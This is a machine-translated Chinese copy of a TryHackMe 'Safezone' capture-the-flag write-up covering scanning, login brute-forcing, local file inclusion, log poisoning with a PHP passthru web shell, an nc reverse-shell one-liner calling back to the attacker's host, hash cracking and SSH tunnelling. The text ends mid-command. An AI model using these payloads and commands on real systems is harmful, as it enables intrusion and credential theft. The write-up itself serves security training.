<html>
<head>
<title>TryHackMe Writeup — Safezone</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道—安全地带</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-safezone-95617de166c2?source=collection_archive---------0-----------------------#2021-06-09">https://infosecwriteups.com/tryhackme-writeup-safezone-95617de166c2?source=collection_archive---------0-----------------------#2021-06-09</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="4dfe" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">嗨，伙计们，又和特里哈克姆with玩得开心了。所以，这里是通过这个<strong class="js iu">安全区</strong>挑战的记录和指南。这个CTF房间是由CTF情人为CTF情人设计的。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div class="gh gi ko"><img src="../Images/15445a68399c6c7b091dbbb5c7975871.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*AKGs6LfjnqJ1TqcUShs12Q.png"/></div></figure><p id="023c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">房间</strong>:<a class="ae kw" href="https://tryhackme.com/room/safezone" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/safezone</a><br/><strong class="js iu">级别</strong>:中等</p><p id="c58a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">任务</strong>:没有可用的帮助/提示。需要一路到CTF去扎根</p><h1 id="7781" class="kx ky it bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">我们开始吧</h1><p id="db6f" class="pw-post-body-paragraph jq jr it js b jt lv jv jw jx lw jz ka kb lx kd ke kf ly kh ki kj lz kl km kn im bi translated">像往常一样，启动机器并在浏览器中打开IP</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ma"><img src="../Images/cffc6cda8b849a21479b167a8135ccf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qYN6QjsgoVmpJt8rcVUKGg.png"/></div></div></figure><p id="31d9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">只是快速看了一下，只是一个简单的主页面。让我们运行漏洞扫描程序，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="574f" class="mk ky it mg b gy ml mm l mn mo"># nikto -h 10.10.X.X<br/>.....<br/>+ Server: Apache/2.4.29 (Ubuntu)<br/>+ Server leaks inodes via ETags, header found with file /, fields: 0x1f7 0x5ba0b8a8bee0a<br/>+ The anti-clickjacking X-Frame-Options header is not present.<br/>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br/>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br/>+ Cookie PHPSESSID created without the httponly flag<br/>+ No CGI Directories found (use '-C all' to force check all possible dirs)<br/><strong class="mg iu">+ Multiple index files found: /index.html, /index.php</strong><br/>+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS<br/>+ OSVDB-3233: /icons/README: Apache default file found.<br/>....</span></pre><p id="c6e9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">扫描仪显示有多个索引文件。让我看看，</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mp"><img src="../Images/fc769b482fd64c6c1f429128ae4dd674.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KqjO6KTKvWu_TBUFatDo3w.png"/></div></div><figcaption class="mq mr gj gh gi ms mt bd b be z dk translated">index.php</figcaption></figure><p id="b2ac" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">index.html显示的是登录页面，而index.php显示的是登录表单。如果这是一张表格，那么我们可以检查这张表格是否暴露在SQL注入面前。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="87cf" class="mk ky it mg b gy ml mm l mn mo"># sqlmap --forms --url http://10.10.X.X/index.php --random-agent --risk=3</span></pre><p id="ae92" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">不幸的是，它不容易受到SQL注入的攻击。但是，没关系，如果有任何隐藏路径，我们可以尝试暴力目录路径。由于同一个索引页面有多个扩展，我们需要在路径发现中包括扩展。使用<code class="fe mu mv mw mg b">feroxbuster</code>，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="cef7" class="mk ky it mg b gy ml mm l mn mo"># feroxbuster -w ~/1gb_dict.txt -t 60 --url http://10.10.X.X/ -x txt,php,html -C 403,301,302<br/>...<br/>200        3l        3w       54c <a class="ae kw" href="http://10.10.232.200/logout.php" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X/logout.php</a><br/>200       45l      123w     2334c <a class="ae kw" href="http://10.10.232.200/register.php" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X/register.php</a><br/>200       46l      126w     2372c <a class="ae kw" href="http://10.10.232.200/index.php" rel="noopener ugc nofollow" target="_blank">http://10.10.</a><a class="ae kw" href="http://10.10.232.200/register.php" rel="noopener ugc nofollow" target="_blank">X.X</a><a class="ae kw" href="http://10.10.232.200/index.php" rel="noopener ugc nofollow" target="_blank">/index.php</a><br/>200       23l       55w      503c <a class="ae kw" href="http://10.10.232.200/index.html" rel="noopener ugc nofollow" target="_blank">http://10.10.</a><a class="ae kw" href="http://10.10.232.200/register.php" rel="noopener ugc nofollow" target="_blank">X.X</a><a class="ae kw" href="http://10.10.232.200/index.html" rel="noopener ugc nofollow" target="_blank">/index.html</a><br/><strong class="mg iu">200        3l       21w      121c </strong><a class="ae kw" href="http://10.10.232.200/note.txt" rel="noopener ugc nofollow" target="_blank"><strong class="mg iu">http://10.10.</strong></a><a class="ae kw" href="http://10.10.232.200/register.php" rel="noopener ugc nofollow" target="_blank"><strong class="mg iu">X.X</strong></a><a class="ae kw" href="http://10.10.232.200/note.txt" rel="noopener ugc nofollow" target="_blank"><strong class="mg iu">/note.txt</strong></a><strong class="mg iu"><br/>200        5l       21w      112c </strong><a class="ae kw" href="http://10.10.232.200/~files/pass.txt" rel="noopener ugc nofollow" target="_blank"><strong class="mg iu">http://10.10.X.X/~files/pass.txt</strong></a><br/>[#######] - 17m  1494744/1494744 0s      found:6       errors:187<br/>[#######] - 9m    249124/249124  459/s   <a class="ae kw" href="http://10.10.232.200/" rel="noopener ugc nofollow" target="_blank">http://10.10.232.200/</a><br/>[#######] - 8m    249124/249124  462/s   http://10.10.232.200/~files</span></pre><p id="98cb" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到6个可用的页面，有奇怪的路径。打开它，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="3a45" class="mk ky it mg b gy ml mm l mn mo">Message from <strong class="mg iu">admin</strong> :-<br/><br/>I can't remember my password always , that's why I have saved it in <strong class="mg iu">/home/files/pass.txt</strong> file .</span></pre><p id="74de" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">注意到“admin”将其密码存储在特定的文件<code class="fe mu mv mw mg b"><strong class="js iu">/home/files/pass.txt</strong></code>中。可能有一些页面暴露于LFI或RFI。但是还有另一条路<code class="fe mu mv mw mg b"><strong class="js iu">~files/pass.txt</strong></code>。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="2d9d" class="mk ky it mg b gy ml mm l mn mo">Admin password hint :-<br/><br/><strong class="mg iu">admin__admin</strong><br/><br/>" __ means two numbers are there , this hint is enough I think :) "</span></pre><p id="18c3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们有了管理员用户的凭证</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="1b97" class="mk ky it mg b gy ml mm l mn mo">username: Admin<br/>password: adminXXadmin</span></pre><p id="e2b5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">登录页面在3次尝试登录后有60秒的限制锁定。通过对XX值使用模糊化方法，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="bcad" class="mk ky it mg b gy ml mm l mn mo"># wfuzz -c -z range,00-99 -d "username=admin&amp;password=admin<strong class="mg iu">FUZZ</strong>admin&amp;submit=Submit" -X POST -u http://10.10.X.X/index.php -t 1 -s 20<br/>...<br/>...<br/>000000042:   200        46 L     135 W      2428 Ch     "41"<br/>000000043:   200        46 L     135 W      2428 Ch     "42"<br/>000000044:   200        46 L     135 W      2428 Ch     "43"<br/><strong class="mg iu">000000045:   200        49 L     XXX W      2445 Ch     "XX"</strong><br/>000000046:   200        46 L     132 W      2430 Ch     "45"<br/>000000047:   200        46 L     132 W      2430 Ch     "46"<br/>000000048:   200        46 L     135 W      2428 Ch     "47"<br/>000000049:   200        46 L     135 W      2428 Ch     "48"<br/>000000050:   200        46 L     135 W      2428 Ch     "49"<br/>....<br/>....</span></pre><p id="9a46" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">因为在请求中有一个延迟。幸运的是，我们找到了XX值。让我们登录，</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mx"><img src="../Images/fd060e184a18010f112098f2eef243c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PK87uhx-pvAmKagCAVMMPg.png"/></div></div></figure><p id="8fe7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，我们可以访问管理页面，浏览页面</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi my"><img src="../Images/a0b5cbf3867529da79c21d2ae29a0166.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sEsxFuVmTjmjBR7DbeWvHg.png"/></div></div></figure><p id="39b2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">新闻页面告诉我们有LFI或RFI发生在这个网页上，继续到详细页面</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mz"><img src="../Images/e71c917bc5517526c43e509abb24fca0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cuij0LWioIxD0tA-MkL1FA.png"/></div></div></figure><p id="5109" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">那里有一个文本框。几次尝试之后，这个框只是一个文本框，用来检查用户是否存在。使用用户名字典简单地运行模糊化，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="016d" class="mk ky it mg b gy ml mm l mn mo"># wfuzz -c -w ~/names.txt -d "name=FUZZ&amp;sub=whoami" -X POST -b "PHPSESSID=b1ttpdegqsltofrbcj2ko4akj2" -u http://10.10.X.X/detail.php --filter "h&gt;1572"<br/>....<br/>000000086:   200        117 L    119 W      1643 Ch     "admin"</span></pre><p id="b829" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">仅找到“admin”用户名。没关系，只是运行简单的sqlmap来检查任何SQL注入漏洞，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="bef1" class="mk ky it mg b gy ml mm l mn mo"># sqlmap --forms --url http://10.10.X.X/detail.php --cookie="PHPSESSID=b1ttpdegqsltofrbcj2ko4akj2" --random-agent --risk=3</span></pre><p id="e00c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这里也没有运气。如果我们看源代码，那里有一个提示说有“page”参数可以使用。再次运行fuzzing，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="b089" class="mk ky it mg b gy ml mm l mn mo"># wfuzz -c -w ~/LFI.txt -u "http://10.10.X.X/detail.php?page=FUZZ" -b "PHPSESSID=b1ttpdegqsltofrbcj2ko4akj2" --filter "l&gt;117"<br/><strong class="mg iu">000000015:   200        132 L    237 W      2209 Ch     "/etc/crontab"</strong><br/><strong class="mg iu">000000001:   200        149 L    154 W      3144 Ch     "/etc/passwd"</strong><br/>000000018:   200        127 L    188 W      1948 Ch     "/etc/fstab"<br/>000000005:   200        352 L    1242 W     8871 Ch     "/etc/apache2/apache2.conf"<br/>000000026:   200        134 L    224 W      2201 Ch     "/etc/hosts.deny"<br/>000000038:   200        119 L    118 W      1511 Ch     "/etc/issue"<br/>000000025:   200        127 L    170 W      1902 Ch     "/etc/hosts.allow"<br/>000000024:   200        124 L    135 W      1673 Ch     "/etc/hosts"<br/>000000053:   200        119 L    125 W      1579 Ch     "/etc/networks"<br/>000000051:   200        140 L    248 W      2361 Ch     "/etc/mysql/my.cnf"<br/>000000055:   200        149 L    154 W      3144 Ch     "/etc/passwd"<br/>000000052:   200        121 L    129 W      1588 Ch     "/etc/network/interfaces"<br/>000000048:   200        150 L    311 W      3893 Ch     "/etc/mtab"<br/>000000044:   200        121 L    119 W      1596 Ch     "/etc/lsb-release"<br/>000000080:   200        136 L    228 W      2240 Ch     "/etc/resolv.conf"<br/>000000070:   200        144 L    210 W      2068 Ch     "/etc/profile"<br/>000000083:   200        168 L    332 W      3074 Ch     "/etc/ssh/ssh_config"<br/>....<br/>....<br/>000000084:   200        239 L    509 W      4744 Ch     "/etc/ssh/sshd_config"<br/><strong class="mg iu">000000164:   200        13309 L  165696 W   1371210 Ch   "/var/log/apache2/access.log"</strong><br/>000000181:   200        9912 L   58696 W    693025 Ch   "/var/log/dpkg.log"<br/>000000220:   200        133 L    226 W      57158 Ch    "/var/log/wtmp"</span></pre><p id="3874" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">参考结果，<code class="fe mu mv mw mg b">crontab</code>文件中没有可用的权限提升。同样适用于<code class="fe mu mv mw mg b">passwd</code>文件。最后一个是apache日志。这方面的常见问题是日志中毒漏洞。</p><p id="e34f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">参照<a class="ae kw" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" rel="noopener ugc nofollow" target="_blank"><strong class="js iu">payloadofall things</strong></a></p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi na"><img src="../Images/230cb17ed14c547195b982bac7dfdbbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jVWpXI0VEblZ3-y5lx6ntg.png"/></div></div></figure><p id="e23c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们需要通过用户代理头发送一个恶意负载，并尝试使用<code class="fe mu mv mw mg b">cmd</code>参数LFI。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="04f2" class="mk ky it mg b gy ml mm l mn mo"># curl -b "PHPSESSID=b1ttpdegqsltofrbcj2ko4akj2" http://10.10.X.X/detail.php -A "&lt;?php passthru($_GET['cmd']);?&gt;"<br/># curl -b "PHPSESSID=b1ttpdegqsltofrbcj2ko4akj2" <a class="ae kw" href="http://10.10.X.X/detail.php?page=/var/log/apache2/access.log&amp;cmd=ls" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X/detail.php?page=/var/log/apache2/access.log&amp;cmd=ls</a><br/>....<br/>....<br/>10.X.X.X - - [06/Jun/2021:09:23:40 +0530] "GET /detail.php HTTP/1.1" <strong class="mg iu">200 1758 "-" "dashboard.php<br/>detail.php<br/>index.html<br/>index.nginx-debian.html<br/>index.php<br/>logout.php<br/>news.php<br/>note.txt<br/>register.php<br/>"</strong><br/>10.X.X.X - - [06/Jun/2021:09:24:16 +0530] "GET /detail.php?page=/var/log/apache2/access.log&amp;cmd=id HTTP/1.1" 200 1389835 "-" "curl/7.64.1"<br/>....</span></pre><p id="4cf5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，LFI正在发挥作用。现在，让我们注入反向外壳。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="1b44" class="mk ky it mg b gy ml mm l mn mo"># curl -b "PHPSESSID=t72mkfr54ddhp1l5rn60ft8jvd" <a class="ae kw" href="http://10.10.10.29/detail.php%5C?page%5C=/var/log/apache2/access.log%5C&amp;cmd%5C=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E&amp;1%7Cnc%2010.8.163.74%201993%20%3E/tmp/f" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X/detail.php\?page\=/var/log/apache2/access.log\&amp;cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.8.163.74%201993%20%3E%2Ftmp%2Ff</a></span></pre><p id="fc29" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">并在本地机器上监听</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="0902" class="mk ky it mg b gy ml mm l mn mo"># nc -lvnp 1993<br/>Connection from 10.10.10.29:51346<br/>/bin/sh: 0: can't access tty; job control turned off<br/>$ python3 -c 'import pty; pty.spawn("/bin/bash")'<br/>$ export TERM=xterm</span><span id="5a9d" class="mk ky it mg b gy nb mm l mn mo">www-data@safezone:/var/www/html$</span></pre><p id="fb51" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好了，现在我们可以访问服务器了。只是快速检查一下<code class="fe mu mv mw mg b">/home</code>目录中可用的用户</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="d04d" class="mk ky it mg b gy ml mm l mn mo"># ls /home<br/>yash files</span><span id="12b7" class="mk ky it mg b gy nb mm l mn mo"># ls -al /home/yash<br/>ls: cannot open directory 'yash': Permission denied<br/> <br/># ls -al /home/files<br/>....<br/>....<br/><strong class="mg iu">-rw-r--r-- 1 root  root   105 Jan 29 20:38 '.something#fake_can@be^here'<br/>-rwxrwxrwx 1 root  root   112 Jan 29 10:24  pass.txt</strong><br/>....</span></pre><p id="f66a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">pass.txt是较早的。还有一个奇怪的文件。快速查找</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="8833" class="mk ky it mg b gy ml mm l mn mo"># cat <strong class="mg iu">.something#fake_can@be^here<br/></strong>files:<strong class="mg iu">[HASH]</strong></span></pre><p id="7d0f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好像是用户名和密码。可能会导致SSH访问。让我们看看这是什么散列。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="46ef" class="mk ky it mg b gy ml mm l mn mo"># hashid hash.txt<br/>--File 'hash.txt'--<br/>Analyzing '<strong class="mg iu">[HASH]</strong>'<br/>[+] SHA-512 Crypt<br/>--End of file 'hash.txt'--</span></pre><p id="fd08" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">打开hashcat，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="c81d" class="mk ky it mg b gy ml mm l mn mo"># hashcat -m 1800 -a 0 hash.txt wordlists/dict.txt<br/><strong class="mg iu">...<br/>[HASH]</strong>:<strong class="mg iu">[PASSWORD]<br/>...</strong></span></pre><p id="8828" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们找到了用户的密码。让我们试着登录</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="05bd" class="mk ky it mg b gy ml mm l mn mo"># ssh files@10.10.X.X<br/>files@10.10.X.X's password:</span><span id="76b5" class="mk ky it mg b gy nb mm l mn mo"><strong class="mg iu">files@safezone</strong>:<strong class="mg iu">~</strong>$</span></pre><p id="15a5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">起作用了。让我们看看根目录。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="dc5b" class="mk ky it mg b gy ml mm l mn mo"># ls -al /<br/>drwxr-xr-x  22 root root       4096 Jan 29 00:25 <strong class="mg iu">lib<br/></strong>drwxr-xr-x   2 root root       4096 Mar 29 01:20 <strong class="mg iu">lib64<br/></strong>drwx------   2 root root      16384 Jan 29 00:04 <strong class="mg iu">lost+found<br/></strong>drwxr-xr-x   3 root root       4096 Jan 29 00:04 <strong class="mg iu">media<br/></strong>drwxr-xr-x   2 root root       4096 Apr 26  2018 <strong class="mg iu">mnt<br/>drwxr-x---   2 root yash       4096 Jan 30 19:52 opt<br/></strong>dr-xr-xr-x 116 root root          0 Jun  6 12:46 <strong class="mg iu">proc<br/></strong>drwx------   7 root root       4096 Mar 29 05:15 <strong class="mg iu">root<br/></strong>drwxr-xr-x  26 root root        880 Jun  6 13:36 <strong class="mg iu">run</strong></span></pre><p id="47bf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">“opt”目录显示归“yash”集团所有。找到使用这条路径的人</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="9519" class="mk ky it mg b gy ml mm l mn mo"># grep -rw "/opt" /etc /var /home 2&gt; /dev/null<br/>...<br/>...<br/><strong class="mg iu">/etc/nginx/sites-available/default: root /opt;<br/></strong>...<br/>...</span></pre><p id="6088" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在搜索结果中，这引起了我的注意。打开文件，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="8655" class="mk ky it mg b gy ml mm l mn mo">server {<br/>    listen 127.0.0.1:8000 default_server;<br/>    #listen [::]:8000 default_server;<br/>    ...<br/>    ...<br/>    root /opt;<br/>    ...<br/>    ...<br/>}</span></pre><p id="3037" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">只能从内部进入。从内部卷曲</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="18d3" class="mk ky it mg b gy ml mm l mn mo"># curl 127.0.0.1:8000</span><span id="33e8" class="mk ky it mg b gy nb mm l mn mo">&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;<br/>&lt;body bgcolor="white"&gt;<br/>&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;<br/>&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="2531" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是禁止的，但应用程序正在工作。让我们做SSH隧道，这样我们就可以破解目录。退出服务器，并使用隧道重新进入。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="7e52" class="mk ky it mg b gy ml mm l mn mo"># ssh -L 8080:127.0.0.1:8000 files@10.10.X.X</span></pre><p id="ca5a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好了，现在我们可以跑了</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="da7e" class="mk ky it mg b gy ml mm l mn mo"># feroxbuster -w ~/Project/pentest/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 100 --url http://127.0.0.1:8080/ -x txt,php,html -C 403,301,302</span><span id="900e" class="mk ky it mg b gy nb mm l mn mo">200       18l       38w      462c <a class="ae kw" href="http://127.0.0.1:8080/login.html" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:8080/login.html</a><br/>[########] - 8m    747372/747372  0s      found:1       errors:0<br/>[########] - 8m    249124/249124  469/s   http://127.0.0.1:8080/</span></pre><p id="1263" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">根据过滤器仅找到有效的1页。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nc"><img src="../Images/2dfc4eb75473b3ecbff9c3c0525aef7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SAntUt0wBE8DNLhjQknSiA.png"/></div></div></figure><p id="9390" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">经过几次测试，用户名和密码似乎不容易被攻击。查找javascript文件。那里还有另一条路。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nd"><img src="../Images/35b1d0d3f22864520a3a648bf6d8a8a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lVu0sWSFJ8e8xSU7FDWUEQ.png"/></div></div></figure><p id="d124" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">打开“pentest.php”页面。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ne"><img src="../Images/61fbb8829e4a2a6d5da833833461a43d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xo0775XkDswZCdkYeozlVw.png"/></div></div></figure><p id="bc87" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一个简单unix命令的快速测试，看起来这个盒子正在过滤一些命令，比如bin，whoami，php和python。不过滤<code class="fe mu mv mw mg b">ls</code>、<code class="fe mu mv mw mg b">cat</code>、<code class="fe mu mv mw mg b">curl</code>、<code class="fe mu mv mw mg b">sh</code>等命令。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nf"><img src="../Images/701f9e32e838413fea29e82a63ecd6a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lumEnwvMHPhNFd_I-zR2dQ.png"/></div></div></figure><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ng"><img src="../Images/0ca4f20c0a836c0d1d2e83de5883bb22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eXgJByz9ltqTQqgOnFZ_yQ.png"/></div></div></figure><p id="fd6a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">输入的每个命令都不会在此页面中输出。所以我决定测试我是否从命令输出中写一个文件。</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="6f44" class="mk ky it mg b gy ml mm l mn mo">cat /home/files/pass.txt &gt; /home/files/pass2.txt</span></pre><p id="736b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">打开<code class="fe mu mv mw mg b">files</code>用户主文件夹，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="4afa" class="mk ky it mg b gy ml mm l mn mo"><strong class="mg iu">files@safezone</strong>:<strong class="mg iu">~</strong>$ ls<br/><strong class="mg iu">pass.txt</strong>  pass2.txt</span></pre><p id="d655" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">它工作了。所以，让我们试试其他的</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="1a35" class="mk ky it mg b gy ml mm l mn mo">ls -al /home/yash &gt; /home/files/yash.txt</span><span id="19bc" class="mk ky it mg b gy nb mm l mn mo"># cat ~/yash.txt<br/>...<br/>-rw-rw-r-- 1 yash yash   38 Jan 30 15:24 flag.txt<br/>...</span><span id="001c" class="mk ky it mg b gy nb mm l mn mo">cat 